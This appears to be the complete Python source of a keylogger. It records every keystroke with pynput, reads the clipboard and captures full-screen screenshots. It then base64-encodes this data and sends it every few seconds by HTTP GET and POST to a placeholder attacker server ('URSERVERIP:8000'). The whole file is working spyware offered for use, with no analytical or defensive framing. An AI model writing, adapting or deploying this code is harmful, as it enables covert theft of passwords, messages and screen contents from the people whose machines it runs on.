from pynput import keyboard
import time
import requests # type: ignore
import base64
import io
import pyperclip
from PIL import ImageGrab
import urllib.parse

currStr =""
lastUpdated = time.time()-6
url = "http://URSERVERIP:8000/?data="
encoded_screengrab =""

#Sends the latest Keystrokes(every 5 sec or so) via http request to the desierd url set 
def keyExfil(key):
    global currStr
    global url
    global lastUpdated
    if  time.time() - lastUpdated >= 5:
        base64_data=base64.b64encode(currStr.encode()).decode()
        try:
            response = requests.get(url+base64_data)
            send_screengrap()
        except Exception as e:
            print(f"Failed to send request: {e}")
        lastUpdated = time.time() 
        currStr = ""
    try:
        currStr += key.char
    except AttributeError:
        if key == keyboard.Key.enter:
            currStr += "\n"
        elif key == keyboard.Key.tab or key == keyboard.Key.space:
            currStr += "\t"
        else:
            currStr += f"[{key.name}]"
            
#Save Clipboard Contents in next Log entry     
def get_clipboard(): 
    global currStr
    currStr = pyperclip.paste()
    
def send_screengrap():
    global encoded_screengrab
    screengrab = ImageGrab.grab()
    with io.BytesIO() as img_byte_array:
        screengrab.save(img_byte_array, format='PNG')
        img_byte_array.seek(0)
        encoded_screengrab = base64.b64encode(img_byte_array.read()).decode()    
    response = requests.post(url,encoded_screengrab)

if __name__ == "__main__":
    get_clipboard()
    log = keyboard.Listener(on_press=keyExfil)
    log.start()
    input()
